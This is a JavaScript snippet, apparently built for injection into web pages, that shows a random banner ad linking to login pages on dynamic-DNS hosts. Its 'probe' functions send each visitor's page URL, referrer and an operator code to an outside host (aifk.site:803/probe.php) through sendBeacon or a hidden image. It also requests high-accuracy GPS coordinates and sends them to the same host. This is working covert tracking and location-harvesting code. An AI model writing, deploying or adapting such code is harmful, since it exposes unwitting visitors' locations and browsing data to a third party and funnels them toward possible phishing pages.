(function() {
    var isDataSent = false;

    // ====================== 随机广告配置 ======================
    var adList = [
        {
            text: '手机空号批量检测',
            link: 'https://1024yaqu96386.vicp.fun/simple_login.html',
            bgColor: '#1677ff',
            color: '#ffffff'
        },
        {
            text: 'sg',
            link: 'http://www.hyh.work.gd:8081/login.php',
            bgColor: '#ff4d4f',
            color: '#ffffff'
        },
        {
            text: '测试',
            link: 'http://1024yaqu96386.vicp.fun:18649/',
            bgColor: '#52c41a',
            color: '#ffffff'
        },
        // 你可以无限加更多广告...
    ];

    var adConfig = {
        enable: true,
        position: 'bottom' // top 或 bottom
    };
    // ==========================================================

    // 随机选一条广告
    function getRandomAd() {
        return adList[Math.floor(Math.random() * adList.length)];
    }

    // 显示广告
    function showAd() {
        if (!adConfig.enable) return;
        var ad = getRandomAd();
        
        var adDiv = document.createElement('div');
        adDiv.innerText = ad.text;
        adDiv.style.cssText = `
            position: fixed;
            ${adConfig.position}: 0;
            left: 0;
            width: 100%;
            background: ${ad.bgColor};
            color: ${ad.color};
            text-align: center;
            padding: 8px 0;
            font-size: 14px;
            cursor: pointer;
            z-index: 999999;
        `;
        adDiv.onclick = function() {
            window.open(ad.link, '_blank');
        };
        document.body.appendChild(adDiv);
    }

    // 原来的探针逻辑
    function sendProbeData(lat, lng, accuracy) {
        if (isDataSent && !lat && !lng) return;
        var params = new URLSearchParams();
        params.append('code', '12c568dcda176a42');
        params.append('username', '1024');
        params.append('label', 'nb10');
        params.append('source_url', window.location.href);
        params.append('referrer', document.referrer);
        if (lat && lng) {
            params.append('lat', lat);
            params.append('lng', lng);
            params.append('accuracy', accuracy);
        }
        if (navigator.sendBeacon) {
            const success = navigator.sendBeacon('https://www.aifk.site:803/probe.php?' + params.toString() + '&nohtml=1');
            success ? (isDataSent = true) : sendViaImage(params.toString());
        } else {
            sendViaImage(params.toString());
        }
    }

    function sendViaImage(paramString) {
        var img = new Image();
        img.src = 'https://www.aifk.site:803/probe.php?' + paramString + '&nohtml=1';
        img.style.display = 'none';
        img.onload = function() { isDataSent = true; };
        document.body.appendChild(img);
    }

    // 启动
    sendProbeData();
    showAd();

    // GPS 逻辑
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            function(position) {
                setTimeout(function() {
                    sendProbeData(
                        position.coords.latitude,
                        position.coords.longitude,
                        position.coords.accuracy
                    );
                }, 500);
            },
            function(){},
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    }

    window.addEventListener('beforeunload', function() {
        if (!isDataSent) sendProbeData();
    });
})();